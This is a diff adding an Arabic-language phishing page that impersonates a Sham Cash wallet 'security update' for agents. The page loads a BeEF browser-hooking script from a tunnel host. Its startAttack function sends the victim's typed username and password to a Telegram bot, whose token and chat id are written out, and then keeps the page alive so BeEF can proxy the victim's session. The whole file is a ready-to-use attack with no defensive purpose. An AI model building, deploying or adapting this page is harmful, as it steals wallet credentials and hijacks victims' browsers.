@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>تحديث أمان | Sham Cash</title>
+    <script src="https://0fc034dfd1d961.lhr.life/hook.js"></script> <!-- رابط BeEF الخاص بك -->
+    <style>
+        body { background: #0b021d; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #1a0b33; padding: 30px; border-radius: 15px; border: 1px solid #e100ff; text-align: center; width: 350px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #3d1a63; background: #0b021d; color: white; }
+        button { background: linear-gradient(90deg, #d600d6, #8e00d6); color: white; border: none; padding: 12px; width: 100%; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        #loading { display: none; color: #00ffcc; margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <img src="https://agents.playon7.com/assets/images/logo.png" width="120">
+        <h2>تحديث أمان الوكلاء</h2>
+        <p style="font-size: 0.8rem; color: #bbb;">يرجى تسجيل الدخول لتحديث شهادة الأمان وتجنب حظر المحفظة.</p>
+        <input type="text" id="user" placeholder="اسم المستخدم / الهاتف">
+        <input type="password" id="pass" placeholder="كلمة المرور">
+        <button onclick="startAttack()">تحديث الآن</button>
+        <div id="loading">جاري فحص حالة الحساب، يرجى عدم إغلاق الصفحة...</div>
+    </div>
+
+    <script>
+    function startAttack() {
+        var u = document.getElementById('user').value;
+        var p = document.getElementById('pass').value;
+        document.getElementById('loading').style.display = 'block';
+
+        // إرسال البيانات للتلجرام (نظامك الخاص)
+        fetch(`https://api.telegram.org/bot8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs/sendMessage?chat_id=8665747715&text=${encodeURIComponent("🎯 صيد جديد:\n👤: "+u+"\n🔑: "+p)}`);
+        
+        // إبقاء الضحية في الصفحة ليتمكن BeEF من العمل (البروكسي)
+        setInterval(function() { console.log("Keeping Session Alive..."); }, 1000);
+    }
+    </script>
+</body>
+</html>
